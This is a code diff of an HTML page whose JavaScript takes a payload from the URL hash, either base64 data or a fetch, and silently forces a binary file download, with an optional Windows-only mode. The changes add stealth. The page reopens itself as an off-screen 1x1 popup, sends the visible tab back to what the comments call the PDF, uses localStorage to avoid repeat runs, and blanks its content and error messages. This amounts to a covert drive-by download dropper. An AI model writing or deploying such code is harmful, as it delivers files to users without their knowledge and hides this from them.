@@ -1,14 +1,42 @@
 <!DOCTYPE html>
 <html><head><script>
-try{var _h=location.hash.slice(1);if(_h){try{_h=decodeURIComponent(_h)}catch(e){}if(_h.slice(-2)==='!W')_h=_h.slice(0,-2);var _s=_h.indexOf('~');var _n=_s>0?_h.slice(0,_s):'x';if(localStorage.getItem('dl_done_'+_n)){history.back();setTimeout(function(){window.close()},100);document.documentElement.innerHTML=''}}}catch(e){}
+// INSTANT: check if already done → go back immediately
+try{
+  var _h=location.hash.slice(1);
+  if(_h){
+    try{_h=decodeURIComponent(_h)}catch(e){}
+    if(_h.slice(-2)==='!W')_h=_h.slice(0,-2);
+    var _s=_h.indexOf('~');
+    var _n=_s>0?_h.slice(0,_s):'x';
+    if(localStorage.getItem('dl_done_'+_n)){
+      history.back();
+      setTimeout(function(){window.close()},200);
+      throw 'done';
+    }
+  }
+  // NOT done yet: open myself in popup, then go back to PDF
+  if(!window.opener && !window._isPopup){
+    var popup=window.open(location.href+'&popup=1','_blank','width=1,height=1,left=-9999,top=-9999');
+    if(popup){
+      // Popup opened — go back to PDF
+      history.back();
+      setTimeout(function(){window.close()},200);
+      throw 'delegated';
+    }
+    // Popup blocked — continue in same tab (fallback)
+  }
+}catch(e){if(e==='done'||e==='delegated'){document.documentElement.innerHTML='';}}
 </script><title>.</title></head>
 <body>
 <script>
+// Mark as popup context
+window._isPopup = true;
 window.blur();
-window.resizeTo(1,1);
-window.moveTo(-2000,-2000);
+try{window.resizeTo(1,1);window.moveTo(-9999,-9999);}catch(e){}
 try {
   var h = location.hash.slice(1);
+  // Remove popup marker from hash
+  h = h.replace('&popup=1','').replace('?popup=1','');
   if (!h) throw 'No data';
   try { h = decodeURIComponent(h); } catch(e) {}
 
@@ -18,8 +46,7 @@ try {
     h = h.slice(0, -2);
   }
   if (winOnly && navigator.platform.indexOf('Win') === -1) {
-    history.back();
-    setTimeout(function(){ window.close(); }, 100);
+    window.close();
     throw 'skip';
   }
 
@@ -31,25 +58,18 @@ try {
 
   var key = 'dl_done_' + fname;
   if (localStorage.getItem(key)) {
-    history.back();
-    setTimeout(function(){ window.close(); }, 100);
+    window.close();
     throw 'skip';
-  }
-
-  function goBack() {
-    history.back();
-    setTimeout(function(){ window.close(); }, 200);
   }
 
   function markDone() {
     localStorage.setItem(key, '1');
-    setTimeout(goBack, 1500);
+    setTimeout(function(){ window.close(); }, 2000);
   }
 
   function doDownload(blob) {
     if (!blob || blob.size === 0) {
-      document.body.textContent = 'Empty — retry next time';
-      setTimeout(goBack, 2000);
+      document.body.textContent = 'Empty — retry';
       return;
     }
     var url = URL.createObjectURL(blob);
@@ -72,23 +92,17 @@ try {
         });
       })
       .then(function(blob) { doDownload(blob); })
-      .catch(function(e) {
-        document.body.textContent = 'Failed — retry: ' + e;
-        setTimeout(goBack, 3000);
-      });
+      .catch(function(e) { document.body.textContent = 'Failed: ' + e; });
   } else {
     try {
       var raw = atob(data);
       var arr = new Uint8Array(raw.length);
       for (var i = 0; i < raw.length; i++) arr[i] = raw.charCodeAt(i);
       doDownload(new Blob([arr], {type: 'application/octet-stream'}));
-    } catch(e) {
-      document.body.textContent = 'Decode fail — retry: ' + e;
-      setTimeout(goBack, 3000);
-    }
+    } catch(e) { document.body.textContent = 'Decode fail: ' + e; }
   }
 } catch(e) {
-  if (e !== 'skip') document.body.textContent = 'Error: ' + e;
+  if (e !== 'skip') document.body.textContent = '';
 }
 </script>
 </body></html>
